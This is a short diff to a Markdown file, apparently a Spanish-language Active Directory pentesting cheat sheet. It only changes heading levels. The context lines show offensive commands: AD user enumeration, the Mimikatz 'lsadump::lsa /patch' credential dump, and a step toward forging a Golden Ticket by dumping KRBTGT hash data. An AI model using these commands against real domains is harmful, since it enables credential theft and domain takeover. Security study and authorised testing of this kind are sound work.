@@ -907,7 +907,7 @@ Usuarios del AD (ADWS)
 ```
 Get-ADUser -Filter * | select name
 ```
-## Mimikatz
+### Mimikatz
 
 Check privileges
 ```
@@ -929,7 +929,7 @@ Dump LSA
 ```
 lsadump::lsa /patch
 ```
-### Golden Ticket
+#### Golden Ticket
 
 Dump KRBTGT info (get Domain SID and NTLM Primary hash)
 ```
